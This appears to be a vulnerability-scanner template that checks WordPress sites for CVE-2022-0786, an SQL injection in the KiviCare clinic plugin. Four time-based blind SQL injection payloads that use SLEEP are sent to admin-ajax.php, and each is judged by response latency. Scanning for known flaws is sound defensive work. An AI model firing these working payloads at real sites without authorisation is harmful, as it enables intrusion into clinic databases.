name: poc-yaml-wordpress-kivicare-cve-2022-0786-sqli
manual: true
transport: http
set:
    rInt1: randomInt(5, 8)
rules:
    check:
        request:
            cache: true
            method: GET
            path: /
        expression: response.status == 200
        output:
            checklatency: response.latency
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=ajax_post&route_name=get_doctor_details&clinic_id%5bid%5d=(CASE+WHEN+(4=4)+THEN+SLEEP({{rInt1}})+ELSE+5+END)
        expression: response.status == 200 && response.latency - checklatency > rInt1 * 1000
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"(CASE+WHEN+(4=4)+THEN+SLEEP({{rInt1}})+ELSE+5+END)"%7D
        expression: response.status == 200 && response.latency - checklatency > rInt1 * 1000
    r2:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1+AND+(SELECT+42+FROM+(SELECT(SLEEP({{rInt1}})))b)"%7D
        expression: response.status == 200 && response.latency - checklatency > rInt1 * 1000
    r3:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP({{rInt1}})))b
        expression: response.status == 200 && response.latency - checklatency > rInt1 * 1000
expression: check() && r0() || r1() || r2() || r3()
detail:
    author: Editor
    links:
        - https://wpscan.com/vulnerability/53f493e9-273b-4349-8a59-f2207e8f8f30
    vulnerability:
        id: CT-439433
        level: critical
